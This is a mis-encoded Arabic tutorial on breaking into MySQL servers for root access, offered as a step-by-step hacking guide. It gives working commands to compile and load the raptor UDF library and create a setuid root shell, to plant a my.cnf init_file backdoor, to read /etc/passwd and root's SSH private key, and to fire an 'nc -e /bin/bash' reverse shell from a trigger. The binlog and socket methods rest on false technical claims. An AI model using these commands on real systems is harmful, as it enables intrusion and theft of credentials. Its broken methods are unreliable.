### **๐ฅ ุดุฑุญ ูู ุทุฑู ุงุณุชุบูุงู MySQL ููุญุตูู ุนูู Root Access ุจุดูู ุฃุนูู ูุจุฃุณููุจ ุฃุจุณุท ๐ฅ**

#### **๐ ุงูููุฑุฉ ุงูุนุงูุฉ**

ุฅุญูุง ุจูุชููู ุนู **ุงุฎุชุฑุงู MySQL** ุนุดุงู ููุตู ูุตูุงุญูุงุช **Root** ูู ุงููุธุงูุ ูุงูููุถูุน ููู ุจูุชูุญูุฑ ุญูู:

1. **ุงุณุชุบูุงู ุฃุฎุทุงุก ุงูุฅุนุฏุงุฏุงุช (Misconfigurations)**.
2. **ุงุณุชุบูุงู ุงูุตูุงุญูุงุช ุงูุนุงููุฉ (Privilege Escalation)**.
3. **ุงุณุชุฎุฏุงู ููุฒุงุช MySQL ุจุทุฑู ุบูุฑ ูุชููุนุฉ**.

ููุดุฑุญ ูู ุทุฑููุฉ ุจุงูุชูุตูู ูุจุฃุณููุจ ุณููุ ูุน ุฃูุงูุฑ ูุงุถุญุฉุ ูุจุฃูุซูุฉ ุทุฑููุฉ ูู ุงููุงูุน ุนุดุงู ุชุจูู ูุงูููุง 100%! ๐๐

---

# **๐ด ุงูุทุฑููุฉ 1: ุงุณุชุบูุงู UDF (User Defined Functions) ูุชูููุฐ ุฃูุงูุฑ Root**

### **๐ ุงูููุฑุฉ**

- MySQL ุจูุณูุญ ูู ุชุถูู ุฏูุงู ุฌุฏูุฏุฉ ุจุงุณุชุฎุฏุงู **ููุชุจุงุช C (`.so` files)**.
- ูู MySQL ุดุบุงู ุจุญุณุงุจ **root**ุ ูุจูู ุงูุฏุงูุฉ ุงููู ููุถูููุง ุชูุฏุฑ ุชุดุบู **ุฃูุงูุฑ ุงููุธุงู** ุจุตูุงุญูุงุช **root**!
- ููุณุชุฎุฏู ููุฏ ุฌุงูุฒ ููุฑูุนู ูู MySQL ุนุดุงู ูุฎููู ูุดุบู ุฃู ุฃูุฑ ูุฑูุฏู.

### **๐ ุชูููุฐ ุงููุฌูู ุฎุทูุฉ ุจุฎุทูุฉ**

#### โ **1- ุชุฃูุฏ ุฅู MySQL ุดุบุงู ูู Root**

```bash
ps aux | grep mysql
```

โ๏ธ ูู ูููุช ุญุงุฌุฉ ุฒู:

```
root       1234  0.0  1.2  65600  8000 ?       Ssl  12:34   0:00 /usr/sbin/mysqld
```

ุฏู ูุนูุงู ุฅู MySQL ุดุบุงู ูู **Root**ุ ูุนูู ุงูุงุฎุชุฑุงู ููููู ูุงุฌุญ! ๐

#### โ **2- ุชุฃูุฏ ุฅู MySQL ูุด ูุญูู ุจุจุงุณูุฑุฏ**

```bash
mysql -u root
```

โ๏ธ ูู ุฏุฎูุช ูู ุบูุฑ ูุง ูุทูุจ ููู ุจุงุณูุฑุฏุ ูุฅูุช ูู ุฃูุงู ุชุงู ูู ูุงุญูุฉ ุงูุงุฎุชุฑุงู ๐

#### โ **3- ุฑูุน ูุงุณุชุบูุงู ููุชุจุฉ UDF**

1๏ธโฃ ุชุญููู ุงูููุฏ ุงูุถุงุฑ ู **ุชุญูููู ูููุชุจุฉ `.so`**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

2๏ธโฃ ุงูุฏุฎูู ุฅูู MySQL ูุชุญููู ุงูููุชุจุฉ

```bash
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

3๏ธโฃ ุชุดุบูู ุฃูุฑ ุงููุธุงู ูุฅูุดุงุก **Root Shell**

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

4๏ธโฃ ุชุดุบูู ุงูู **Root Shell**:

```bash
/tmp/rootbash -p
```

๐ก **ูุซุงู ุทุฑูู:**  
**ุฅูุช ุฏุฎูุช ูุญู ููู ูุทุนููุฉุ ุดูุช ุงูุซูุงุฌุฉ ููุชูุญุฉุ ุฑูุญุช ูุงุฎุฏ ุฑุบูู ููู ูู ุบูุฑ ูุง ุญุฏ ูุญุณ! ๐**

---

# **๐ด ุงูุทุฑููุฉ 2: ุงุณุชุบูุงู my.cnf ูุชุดุบูู ุฃูุงูุฑ Root ุนูุฏ ุฅุนุงุฏุฉ ุชุดุบูู MySQL**

### **๐ ุงูููุฑุฉ**

- **my.cnf** ูู ููู ุงูุฅุนุฏุงุฏุงุช ุจุชุงุน MySQLุ ููู ุนุฏููุงูุ ูููู ูุฎููู ูุดุบู **ุฃูุงูุฑ ุถุงุฑุฉ** ุนูุฏ ุชุดุบูู ุงูุฎุฏูุฉ!
- ูู MySQL ุจูุดุชุบู ูู **Root**ุ ูุจูู ุฃู ุฃูุฑ ููุถููู ููุง ููุชููุฐ ุจุตูุงุญูุงุช **Root**.

### **๐ ุชูููุฐ ุงููุฌูู ุฎุทูุฉ ุจุฎุทูุฉ**

1๏ธโฃ ุชุนุฏูู ุงูููู ุจุญูุซ ูุดุบู **Reverse Shell** ุนูุฏ ุชุดุบูู ุงูุฎุฏูุฉ

```bash
echo '[mysqld]' >> /etc/mysql/my.cnf
echo 'init_file=/tmp/backdoor.sql' >> /etc/mysql/my.cnf
```

2๏ธโฃ ุฅูุดุงุก ููู **Backdoor SQL** ุงููู ููููุฐ ุงูุฃูุงูุฑ

```bash
echo 'CREATE TABLE pwn(line blob);' > /tmp/backdoor.sql
echo 'INSERT INTO mysql.pwn VALUES (\'<?php system($_GET["cmd"]); ?>\');' >> /tmp/backdoor.sql
```

3๏ธโฃ ุฅุนุงุฏุฉ ุชุดุบูู MySQL

```bash
systemctl restart mysql
```

4๏ธโฃ ุงุณุชุฎุฏู **ุงูู Backdoor** ุนุดุงู ุชููุฐ ุฃูุงูุฑ!

๐ก **ูุซุงู ุทุฑูู:**  
**ุฒู ุฅูู ุชุญุท "ุดููู ูุงุฐุจุฉ" ุนูู ููุชุจ ุงููุฏูุฑ ุจุญูุซ ููุฑุฃูุง ููููุฐ ุงููู ููุชูุจ ูููุง ูู ุบูุฑ ูุง ูุญุณ! ๐**

---

# **๐ด ุงูุทุฑููุฉ 3: ุงุณุชุบูุงู LOAD DATA INFILE ูุณุฑูุฉ ุงููููุงุช**

### **๐ ุงูููุฑุฉ**

- **`LOAD DATA INFILE`** ุจูุณูุญ ูู MySQL ุจุชุญููู ูููุงุช ูุตูุฉ ูู ุงูุณูุฑูุฑ.
- ูุณุชุฎุฏูู ุนุดุงู ููุฑุง **ูููุงุช ุญุณุงุณุฉ** ุฒู `/etc/passwd` ุฃู `id_rsa` (ููุชุงุญ SSH).

### **๐ ุชูููุฐ ุงููุฌูู ุฎุทูุฉ ุจุฎุทูุฉ**

1๏ธโฃ ุงูุฏุฎูู ุฅูู MySQL

```bash
mysql -u root
```

2๏ธโฃ ุชุญููู ููู **passwd**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

3๏ธโฃ ูู ูุฌุญุชุ ูููู ุชุญุงูู ุชูุฑุง **ููุชุงุญ SSH** ุจุชุงุน root

```sql
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

๐ก **ูุซุงู ุทุฑูู:**  
**ุฒู ุฅูู ุชูู ูุฑุง ุญุฏ ููู ุจูุฏุฎู ุจุงุณูุฑุฏ ุงูู ATM ูุชุงุฎุฏู ูู ุบูุฑ ูุง ูุญุณ! ๐**

---

# **๐ด ุงูุทุฑููุฉ 4: ุงุณุชุบูุงู Triggers ูุชูููุฐ ุฃูุงูุฑ Root ุชููุงุฆููุง**

### **๐ ุงูููุฑุฉ**

- **Triggers** ูู ุฃูุงูุฑ ุจุชุชููุฐ **ุชููุงุฆููุง** ููุง ูุญุตู ุชุนุฏูู ูุนูู ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช.
- ูุณุชุฎุฏููุง ุนุดุงู ูุดุบู **Reverse Shell** ูู ูุง ุญุฏ ูุถูู ุจูุงูุงุช ุฌุฏูุฏุฉ.

### **๐ ุชูููุฐ ุงููุฌูู ุฎุทูุฉ ุจุฎุทูุฉ**

1๏ธโฃ ุฅูุดุงุก **Trigger** ูุดุบู **Reverse Shell**

```sql
DELIMITER //
CREATE TRIGGER myTrigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    SELECT do_system('nc -e /bin/bash YOUR_IP 4444');
END;
//
DELIMITER ;
```

2๏ธโฃ ุชุดุบูู **Netcat Listener** ุนูู ุฌูุงุฒู

```bash
nc -lvnp 4444
```

3๏ธโฃ ุจูุฌุฑุฏ ุฅุถุงูุฉ ุจูุงูุงุช ุฌุฏูุฏุฉุ ูุชุงุฎุฏ **Root Shell**!

๐ก **ูุซุงู ุทุฑูู:**  
**ุฒู ุฅูู ุชุญุท ูุบู ูู ูุฑุณู ุญุฏุ ูุฃูู ูุง ููุนุฏ ุนูููุ "ุจููู" ๐**

---

# **๐ด ุงูุทุฑููุฉ 5: ุงุณุชุบูุงู ูููุงุช Unix Socket ูุณุฑูุฉ ุงูุฌูุณุฉ**

### **๐ ุงูููุฑุฉ**

- MySQL ุจูุณุชุฎุฏู **Unix Sockets** ูุชุฎุฒูู ุฌูุณุงุช ุงููุณุชุฎุฏููู (`mysqld.sock`).
- ูู ุนูุฏู ุตูุงุญูุงุช ุนูู ุงูู **Socket File**ุ ุชูุฏุฑ ุชุฏุฎู ูู **Root** ูู ุบูุฑ ุจุงุณูุฑุฏ.

### **๐ ุชูููุฐ ุงููุฌูู ุฎุทูุฉ ุจุฎุทูุฉ**

1๏ธโฃ ุชุดุบูู MySQL ูู ุฎูุงู ุงูู **Socket**

```bash
mysql --socket=/var/run/mysqld/mysqld.sock
```

โ๏ธ ูู ูุฌุญ ุงูุฏุฎููุ ูุฅูุช ุจููุช root ูู MySQL!

๐ก **ูุซุงู ุทุฑูู:**  
**ุฒู ุฅูู ุชูุงูู ููุชุงุญ ุจุงุจ ุงูุดูุฉ ูุญุทูุท ูู ุงูุฏุฑุฌุฉ ูุฏุงูู ูุชุณุชุฎุฏูู ุนุงุฏู ๐**


---



## **๐ด 6. ุงุณุชุบูุงู ูููุงุช ุงูู Binlogs ูุชูููุฐ ุฃููุงุฏ ุถุงุฑุฉ**

### **๐ ุงูููุฑุฉ:**

- MySQL ุจูุณุฌู ูู ุงูุฃูุงูุฑ ุงููู ุจุชุชููุฐ ูู ุญุงุฌุฉ ุงุณููุง **Binary Logs (binlogs)**.
- ูู MySQL ุจูุดุชุบู ูู rootุ ูููู ูุณุชุบู ุฏู ุนุดุงู ูุฎุฒู ุฃูุงูุฑ ุฎุจูุซุฉ ุชุชููุฐ ูุงุญููุง.

### **๐ ุงูุทุฑููุฉ:**

1๏ธโฃ ูุนู Binlogs:

```sql
SET GLOBAL log_bin_trust_function_creators = 1;
```

2๏ธโฃ ุฃูุดุฆ **UDF ุฎุจูุซ** ูู Binlogs:

```sql
CREATE FUNCTION my_root_function RETURNS STRING DETERMINISTIC RETURN 'Hello Root!';
```

3๏ธโฃ ุฏูููุชู ุนูุฏู **Function ุฎุจูุซุฉ ุฌูู ุงูู Binlogs** ุชุชููุฐ ููุง ุงูุณูุฑูุฑ ูุชุนููู Restart!

### **๐ฅ ุงูุฎูุงุตุฉ:**

**ุฒู ุฅูู ุชูุชุจ ุฃูุฑ ุณุฑู ูู ูุฐูุฑุฉ ุงููุฏูุฑ ูุชุฎููู ูู ุงููู ูููุฐู ูู ุบูุฑ ูุง ูุญุณ! ๐**

---

## **๐ ุฎูุงุตุฉ ูู ุงูุทุฑู ูุงุฎุชุฑุงู MySQL ูุงูุญุตูู ุนูู Root**

|**ุฑูู**|**ุงูุทุฑููุฉ**|**ุงูููุฑุฉ**|
|---|---|---|
|1๏ธโฃ|**UDF Exploit**|ุชุญููู ููุชุจุฉ `.so` ุฎุจูุซุฉ ุนุดุงู ุชูููุฐ ุฃูุงูุฑ root|
|2๏ธโฃ|**my.cnf Hijacking**|ุชุนุฏูู ุฅุนุฏุงุฏุงุช MySQL ุนุดุงู ูููุฐ ููุฏ ุฎุจูุซ ุนูุฏ Restart|
|3๏ธโฃ|**LOAD DATA INFILE**|ุชุญููู ูููุงุช ุญุณุงุณุฉ ูู ุงููุธุงู|
|4๏ธโฃ|**Triggers Exploit**|ุฅูุดุงุก Trigger ูููุฐ Reverse Shell ุชููุงุฆููุง|
|5๏ธโฃ|**Unix Socket Hijacking**|ุณุฑูุฉ ุฌูุณุฉ MySQL ูู ููู `mysqld.sock`|
|6๏ธโฃ|**Binlogs Attack**|ุฒุฑุน ุฃููุงุฏ ุฎุจูุซุฉ ุฏุงุฎู Binary Logs|

---

๐๐ฅ **ูุฏู ุนูุฏู 6 ุทุฑู ูุฎุชููุฉ ูุงุณุชุบูุงู MySQL ุนุดุงู ุชุงุฎุฏ Root Access!**  
ูู ุนูุฏู ุฃู ุงุณุชูุณุงุฑ ุฃู ูุญุชุงุฌ ุดุฑุญ ุฃุนูู ูุฃู ุทุฑููุฉุ ูููู ูุฃูุง ุชุญุช ุฃูุฑู! ๐๐